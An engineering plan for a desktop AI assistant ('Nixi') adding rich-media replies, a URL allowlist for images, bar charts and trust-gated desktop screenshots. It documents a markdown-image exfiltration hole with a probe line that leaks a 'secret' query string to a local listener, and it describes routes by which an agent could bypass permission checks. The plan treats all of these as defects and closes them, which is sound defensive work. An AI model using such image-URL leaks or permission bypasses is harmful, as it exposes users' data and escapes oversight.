# Plan: Nixi answers with rich media, and can show the user on their own desktop

## The approved decisions, in full

Implementable without opening the intent or the spec.

**The card already renders rich text.** `Conversation.qml:1672` draws every
reply with `textFormat: TextEdit.MarkdownText`. Verified in a live Quickshell
0.3.1 window: GFM tables, task lists, strikethrough, headings, fenced code,
local `file://` PNG **and** local `file://` SVG all render with no QML change.
`spacedMarkdown` (`Conversation.qml:154`) leaves a table block intact. Do not
add a renderer, a charting library, a WebEngine view, or a typed block model to
the `ListModel` — the model stays `{role, body}` strings.

**The card also fetches remote images, today, at Guide.** A reply containing
`![](http://127.0.0.1:8731/x.png?secret=LEAKED)` produced that GET at a local
listener, unprompted. This is on `master`, is reported privately under
SECURITY.md (never a public issue), and is probably inherited from upstream
omarchy-ask. Step 1 closes it and must land before any step that encourages the
agent to emit images.

**The control is an allowlist, not a blocklist.** An image renders only when its
URL is a `file://` path inside Nixi's media directory. `http`, `https`, `data:`
and every other local path are rewritten from an image `![alt](url)` into a
plain link `[alt](url)`: the text survives, the fetch does not.

**Charts are drawn by the bridge, not the agent.** The agent emits a fenced
` ```nixi-chart ` block; the bridge replaces it with an SVG it rendered itself.
The bridge is Nixi's own process, not a tool the agent invokes, so no permission
request exists to cancel and charts work at **Guide**, where the agent may not
write a file at all. Bars only — no lines, pies, axes, legends or colour
schemes.

**ai-mirror attaches only at Mechanic, and only on Claude.** Proved by reading
`claude-agent-acp` 0.81.2: ACP `mcpServers` map into the Claude Code SDK's own
option (`dist/acp-agent.js:6214`), and `mcp__*` calls reach `canUseTool`
(`:5552`) ending in `requestPermissionFromClient` (`:5657`) — an ordinary ACP
permission request. Codex and OpenCode are unproved (see #74, #75) and are not
attached. ai-mirror's own desktop consent dialog is kept as a second gate; Nixi
does not add a third prompt of its own.

**Shared logic lives in `MediaModel.js`** at the repo root: Qt-free CommonJS,
imported by QML as `import "MediaModel.js" as MediaModel` and `require`d by
`bridge/media-model.test.js` under node. This is the existing `TourModel.js` /
`bridge/tour-model.test.js` pattern. The allowlist runs in **QML**, in the
`text:` binding ahead of `spacedMarkdown`, because that binding sees the whole
accumulated body on every render — a markdown image split across two streamed
chunks is never half-checked.

**Media directory** is `$NIXI_DATA/media`, default `~/.local/share/nixi/media`,
mode `0700`, pruned oldest-first at session start to a fixed count and byte
budget. It is a cache with a bound, not a transcript.

### Refinement the spec did not carry

The spec wrote `command: "ai-mirror"`. `nix/package.nix:226` enforces "every
program launched by name was pinned", and the adapters are all pinned through
`--set-default NIXI_*_COMMAND` (`nix/package.nix:55-63`). So ai-mirror is pinned
the same way — `NIXI_AI_MIRROR_COMMAND`, an `aiMirror ? null` package argument,
resolved in `harness-policy.js` beside the adapters — rather than spawned by
bare name. Same design, house mechanism.

## Steps

Steps 1–4 are the rich-media half and ship on their own. Steps 5–6 are the
desktop half and depend only on step 2's media directory.

1. **`MediaModel.js` (new, repo root) + `bridge/media-model.test.js` (new): the
   allowlist and the chart renderer.**
   CommonJS like `TourModel.js` (`module.exports`, no `import`), Qt-free, pure
   functions returning new values.
   - `sanitize(markdown, mediaDir)` → markdown with every image whose URL is not
     a `file://` path inside `mediaDir` rewritten `![alt](url)` → `[alt](url)`.
     Match images outside fenced code blocks only; a fenced example of a remote
     image is text, not a fetch. Compare the resolved path with a trailing
     separator so `/media-evil/` cannot pass as `/media/`, and reject any URL
     containing `..` before resolving.
   - `chartSvg(block)` → `{ title, svg }` or `null`. Grammar: optional first
     line `title: <text>`, then `label value` lines. Bars only. Total parsing: a
     malformed block returns `null` and the caller leaves it untouched. Bound
     rows (≤ 24), label length (≤ 48), and clamp values; non-finite or negative
     values make the block malformed. Escape `&<>"` in every label and title
     before interpolating into SVG.
   → verify by `node --test bridge/media-model.test.js`
   Traps: the file is shared with QML, so it must stay CommonJS — an ES `export`
   breaks the card silently at runtime, not at build. No `node:` imports; QML
   has no module loader.

2. **`bridge/bridge.js:96-101`: stop discarding ACP content blocks.**
   Replace `messageText` with a function returning markdown for the blocks the
   ACP schema defines (`bridge/node_modules/@agentclientprotocol/sdk/schema`):
   - `text` → unchanged
   - `image` → required `data` (base64) + `mimeType`; write to
     `<mediaDir>/<sha256(data)[:16]>.<ext>` and return `\n![](file://…)\n`
   - `resource_link` → required `name` + `uri`; a local image file copied into
     the media directory becomes an image, anything else becomes
     `[name](uri)`
   `mimeType` is matched against a fixed allowlist — `image/png`, `image/jpeg`,
   `image/webp`, `image/svg+xml`, `image/gif` — and the extension comes from
   that table, never from the agent. Anything else is a link, not an image.
   Add `mediaDir = join(learnedDir, "media")` beside `learnedDir`
   (`bridge/bridge.js:289`), created `0700`, pruned oldest-first at startup.
   → verify by `node --test bridge/` and the fake agent in `bridge/testing/`
   Traps: `messageText` is called from the `agent_message_chunk` path
   (`bridge/bridge.js:~200`) whose text is fed to `learned.push()` — keep
   returning a string, and keep the LEARNED filter seeing agent text only, not
   file paths. Writes are the bridge's own, so they follow the learned-fact
   discipline: `0600` files, atomic, bounded.

3. **`Conversation.qml:1672` and `Conversation.qml:14`: apply the allowlist.**
   `import "MediaModel.js" as MediaModel` beside the existing imports, and
   change the binding to
   `text: root.spacedMarkdown(MediaModel.sanitize(turn.body, root.mediaDir))`.
   Add a `mediaDir` property on `root`, set from the same
   `$NIXI_DATA/media` rule the bridge uses, resolved once at startup.
   → verify by the exfil probe below; it must now produce no request
   Traps: `nix/package.nix:226` forbids a bare `"node"`/`"gjs"` in plugin QML —
   this step adds no process, so keep it that way. The binding runs on every
   streamed chunk; `sanitize` must stay allocation-light and must never throw,
   or the reply stops rendering mid-turn.

4. **`bridge/bridge.js` (chart substitution) and the tutor brief.**
   In the bridge, after a turn's text is assembled and before it is emitted,
   replace each ` ```nixi-chart ` block with the SVG written by
   `MediaModel.chartSvg`, saved into the media directory like step 2's images.
   Then `skills/nixi/SKILL.md`: a short "shape of the answer" section — a table
   when the answer is more than three parallel facts (keys, options,
   generations), prose otherwise, a `nixi-chart` block when the answer is a
   handful of numbers, and the existing 2–6 sentence discipline unchanged
   because a table *replaces* sentences. One-line echo in `share/CLAUDE.md` for
   harnesses with no skill mechanism.
   → verify by asking the card a keybinding question and a "how big is my
   store" question at Guide
   Traps: the chart block arrives split across streamed chunks, so substitution
   happens where the whole message is known — the `finishLearned()` flush path
   (`bridge/bridge.js:291`), not per chunk. A block that `chartSvg` rejects is
   emitted unchanged and renders as an ordinary code block.

5. **`nix/package.nix` and `nix/hm-module.nix`: ship `MediaModel.js`, pin
   ai-mirror.**
   - `nix/package.nix:130`: `install -Dm644 MediaModel.js $plugin/MediaModel.js`
     beside `TourModel.js`.
   - `nix/package.nix:200`: add `MediaModel.js` to the "overlay plugin is
     missing" list.
   - `nix/package.nix:18-21`: add `aiMirror ? null`; extend `adapterFlags`
     (`:55-63`) with
     `--set-default NIXI_AI_MIRROR_COMMAND <json ["${aiMirror}/bin/ai-mirror" "mcp"]>`.
   - `nix/hm-module.nix:18-20`: pass `aiMirror = if cfg.aiMirror.enable then
     pkgs.ai-mirror else null`, with a new `services.nixi.aiMirror.enable`
     option defaulting to **false**.
   → verify by `nix build .#nixi` and `nix flake check`
   Traps: the source filter (`nix/package.nix:68-74`) excludes only `.png`,
   `.gif`, `.git` and `result`, so a new root `.js` is included automatically —
   but the install and the verification list are both explicit and both need the
   entry. Omarchy's validator rejects symlinks inside the plugin folder. If
   `pkgs.ai-mirror` does not exist in the user's nixpkgs, the option must fail
   with a readable message rather than a Nix trace.

6. **`bridge/harness-policy.js` and `bridge/bridge.js:262`: attach ai-mirror at
   Mechanic, on Claude.**
   - `harness-policy.js`: `resolveAiMirror()` beside `resolveAdapter`, reading
     `NIXI_AI_MIRROR_COMMAND` (JSON array, validated exactly as
     `configuredAgentCommand` validates `NIXI_ACP_COMMAND`), returning `null`
     when unset.
   - `trust-policy.js`: `MCP_CAPABLE_AGENTS = ["claude"]`, and
     `trustPolicy()` gains `mcpServers: level === "guide" || !capable ? [] :
     [aiMirror]`.
   - `bridge/bridge.js:262`: pass that list to `newSession`. The stdio shape is
     `{name, command, args, env}` — **all four are required** by
     `McpServerStdio` in the schema; `env` is a list of `{name, value}` and is
     `[]`.
   - `bridge/bridge.js` `requestPermission`: read
     `params.toolCall?._meta?.claudeCode?.mcpServer`; when a permission arrives
     from a server Nixi did not register, emit a `diagnostic` naming it. Log
     once per session when the field is absent entirely, so an adapter bump that
     drops it is observable rather than silent.
   - Changing trust rebuilds the session, so leaving Mechanic detaches the
     server. Confirm the existing trust path does this; if it only calls
     `applyTrustMode()`, attaching at Mechanic requires a new session, and that
     is the deviation to record.
   → verify by the Mechanic/Guide runtime checks below
   Traps: #74 — a config-spawned MCP server starts outside the permission layer.
   This step must not become a reason to trust MCP generally: the diagnostic is
   detection, not a control. `trust-policy.test.js` and `harness-policy.test.js`
   both assert current shapes and will need their cases extended, not replaced.

## Tests

```sh
node --test bridge/            # all bridge tests, including media-model
python3 tools/test_nixi.py     # existing suite
nix build .#nixi               # install + verification phases
```

Expected: all green. `bridge/media-model.test.js` covers an `http`, `https`,
`data:` and out-of-directory `file://` image each rewritten to a link; an
in-directory `file://` image surviving; an image inside a fenced block left
alone; a `/media-evil/` path not passing as `/media/`; a malformed
`nixi-chart` block returned unchanged; and a hostile chart (long labels, many
rows, negative, non-finite and non-numeric values) producing bounded SVG or no
chart.

The exfil probe, which **fails on `master` today** and must pass after step 3:

```sh
python3 -m http.server 8731 --bind 127.0.0.1 &
# render a reply containing ![leak](http://127.0.0.1:8731/x.png?secret=LEAKED)
# PASS = no request in the server log
```

On p620, in the card: a keybinding question returns a rendered table; a
`nixi-chart` question returns bars **at Guide**; an ACP image block renders
inline. At Mechanic on Claude, asking Nixi to show something produces
ai-mirror's own consent dialog, declining ends the turn with an explanation, and
accepting returns a screenshot in the card. At Guide the same request does not
attach the server at all — checked by `pgrep -f "ai-mirror mcp"` finding
nothing, not only by what the reply says.

## Rollback

Steps 1–4 and 5–6 are separate commits on `feat/86-rich-media`; either half
reverts without the other, and step 1's allowlist is the only one that should
not be reverted alone, since it is also the fix for a live issue.

`services.nixi.aiMirror.enable` defaults to false, so step 5–6 ships inert: a
user who never sets it gets exactly today's behaviour. Reverting the branch
returns the card to plain prose; the media directory is a cache and can be
deleted (`rm -rf ~/.local/share/nixi/media`) with no loss.

## Deviations recorded during implementation

**Step 2 — media logic in `bridge/media.js`, not inline in `bridge.js`.**
`bridge.js` starts the agent on import, so nothing in it can be unit tested. The
existing `bridge/*.js` install glob (`nix/package.nix:135`) ships the new file
without a package change.

**Step 2 — declared type must match the bytes.** Not in the plan. A magic-byte
check (PNG, JPEG, GIF, WebP signatures; `<svg` within the first 4 KB) rejects a
block whose `mimeType` does not match its data, so an agent cannot park other
content under an image name.

**Step 2 — a local file named by `resource_link` is read only at Mechanic.** The
plan said a local image "copied into the media directory becomes an image"
without saying at which trust level. Reading a path the agent names would let it
put any readable file on screen at Guide, with no permission request, when its
own Read tool there is cancelled — the shape of #75. `blockMarkdown` takes
`localFiles`, defaulting to false, and the bridge passes
`currentPolicy().permission !== "cancel"`. At Guide the link still shows. Agent
`image` blocks (base64) are unaffected and work at Guide, as does step 4's chart
path, so nothing in the approved outcome is lost.

**Step 2 — budgets.** 200 files, 64 MiB total, 4 MiB per image. The plan said
"a fixed count and byte budget" without numbers.

**Step 1/3 — reference-style images are rewritten too.** `![a][r]` with a
`[r]: <url>` definition fetches: proved against a local listener. The plan named
only `![alt](url)`. Raw `<img src=…>` does **not** fetch — Qt's markdown
importer ignores it — so it needs no handling, and the step 3 probe records that
rather than guarding it.

**`image/svg+xml` stays allowed.** An SVG referencing `http://` through `href`
and `xlink:href` was rendered from the media directory: no request reached the
listener, and `qt.svg` logged `Could not create image from "http://…"` — the
renderer resolves such references and refuses them, so the file was really
parsed. Qt's SVG renderer does no network loads.

**Step 2/3 — an emitted image must carry alt text.** Qt's markdown importer
renders **nothing** for `![](url)`: rendered side by side in one window, the
image with alt text drew and the one with an empty alt drew nothing at all. Step
2 had emitted `![](file://…)`, so every image the bridge wrote would have been
silently invisible. `blockMarkdown` now always emits a non-empty alt ("image",
or the resource link's flattened name), and `bridge/media.test.js` asserts it.
Step 4's chart alt is its title, which must likewise never be empty.

This is also why step 3's probe first appeared to fail: the local image did not
render, which looked like a broken test harness and was a real defect.

**Step 5 — ai-mirror comes from the user's config, not `pkgs.ai-mirror`.** The
plan said `aiMirror = if cfg.aiMirror.enable then pkgs.ai-mirror else null`.
There is no `pkgs.ai-mirror`: `nix eval nixpkgs#ai-mirror` fails, and the
installed binary comes from its own flake through Home Manager. So the option is
`services.nixi.aiMirror.package` (`nullOr package`, default `null`) and the user
passes their own, exactly as the ACP adapters already work — which also keeps
the decision to install it in the user's config. `enable` would have been a
second switch saying the same thing, so there is only the package.

Verified: `nix build .#nixi` ships `MediaModel.js` and `bridge/media.js` and
pins nothing by default; built with `aiMirror = pkgs.hello` as a stand-in, the
wrapper gains `NIXI_AI_MIRROR_COMMAND=${NIXI_AI_MIRROR_COMMAND-'[".../bin/ai-mirror","mcp"]'}`.

**Step 4 — the chart substitution is a stream filter, not a flush-time pass.**
The plan named `finishLearned()`. Doing it there would hold the whole reply back
to find the block, and the card would stop streaming. `bridge/chart.js` is a
filter in the shape of `learned.js` instead: text passes straight through, and
only a `nixi-chart` block is held, from its opening fence to its closing one. A
block `chartSvg` rejects, or one whose fence never closes, is released byte for
byte. Known limitation: the filter does not track an enclosing fence, so a
`nixi-chart` example inside a larger code block is drawn rather than shown.

**Step 6 — a trust change cannot attach or detach the server.** ACP fixes
`mcpServers` at `newSession`, and Nixi applies a trust change in-session
(`applyTrustMode()`); rebuilding the session instead would discard the
conversation, which is what the card's own "start new session" warning exists to
avoid. So a session started at Guide has no desktop control even after switching
to Mechanic, and says so once: "Desktop control starts with a new session: this
one began at Guide." The reverse is safe — a session that started at Mechanic
keeps the server registered after a switch to Guide, but every permission
request is cancelled there, so no tool of its can run.

**Step 6 — verification by what the bridge SENT.** The plan asked for a live
`pgrep` check. That needs a real Claude session with credentials, so it is listed
as an outstanding runtime check below. What is proved in CI instead: the fake
ACP agent records `newSession`'s `mcpServers`, and the test asserts Guide sends
`[]`, Mechanic sends exactly the ai-mirror entry, and an unpinned machine sends
`[]` at either level.
